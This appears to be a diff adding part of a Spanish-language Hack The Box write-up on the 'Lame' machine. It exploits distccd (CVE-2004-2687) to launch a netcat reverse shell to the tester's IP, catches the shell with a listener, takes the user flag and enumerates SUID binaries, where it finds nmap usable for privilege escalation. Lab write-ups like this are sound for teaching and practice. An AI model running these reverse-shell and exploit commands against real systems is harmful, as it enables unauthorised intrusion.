@@ -156,3 +156,72 @@ Encontramos el exploit en python `distccd_rce_CVE-2004-2687.py`.
 
 Si ejecutamos comandos arbitrarios por ejemplo `ifconfig` comprobamos que estamos en la máquina Lame pero con usuario de deamon, para  saber esto podrías ejecutar en vez de ifconfig `whoami`.
 
+Al saber eso, utilizamos netcat para tener una reverse shell, dejamos en escucha y ejecutamos el exploit enviando nuestra bash al nc.
+
+```
+root@rebcesp:/home/rebcesp/htb/Lame/exploits# python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'nohup nc -e /bin/bash 10.10.14.13 443 & '
+```
+* nohup: es un comando muy importante, lo ponemos para no perder la sesión y que se mantenga en segundo plano trabajando.
+Una explicación mas detallada: Nohup es un comando complementario que le dice al sistema Linux que no detenga otro comando una vez que haya comenzado. Eso significa que seguirá funcionando hasta que se complete, incluso si el usuario que lo inició cierra la sesión. La sintaxis para Nohup es simple y se ve así:
+
+```
+root@rebcesp:/home/rebcesp# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.3] 48791
+whoami
+daemon
+scirpt /dev/null -c bash
+daemon@lame:/tmp$ 
+```
+Buscamos la flag con el comando:
+```console
+daemon@lame:/home$ find \-name user.txt 2>/dev/null
+./makis/user.txt
+```
+Aquí ya tenemos la flag del user.txt, en esta misma sesión podemos  ir a ver si tenemos suerte con la de `root` pero vemos que no tenemos permiso, por lo tanto listamos permisos SUID a ver si hay alguno que nos pueda servir.
+
+```console
+daemon@lame:/$ find \-perm -4000 2>/dev/null
+./bin/umount
+./bin/fusermount
+./bin/su
+./bin/mount
+./bin/ping
+./bin/ping6
+./sbin/mount.nfs
+./lib/dhcp3-client/call-dhclient-script
+./usr/bin/sudoedit
+./usr/bin/X
+./usr/bin/netkit-rsh
+./usr/bin/gpasswd
+./usr/bin/traceroute6.iputils
+./usr/bin/sudo
+./usr/bin/netkit-rlogin
+./usr/bin/arping
+./usr/bin/at
+./usr/bin/newgrp
+./usr/bin/chfn
+./usr/bin/nmap
+./usr/bin/chsh
+./usr/bin/netkit-rcp
+./usr/bin/passwd
+./usr/bin/mtr
+./usr/sbin/uuidd
+./usr/sbin/pppd
+./usr/lib/telnetlogin
+./usr/lib/apache2/suexec
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/pt_chown
+```
+Podemos ver que nmap es SUID , esto nos puede ayudar mucho a escalar  privilegios, podemos comprobarlo haciendo un: `which nmap | xargs ls -l`
+
+```console
+daemon@lame:/$ which nmap | xargs ls -l
+-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
+```
+Esto quiere decir que a nivel de sistema cualquier usuario puede ejecutar este binario de forma temporal como el usuario root, esto significa que podremos tener una reverse shell a la hora de ejecutarlo. Esto se podría hacer con el modo interactivo de nmap.
+
+
+
+
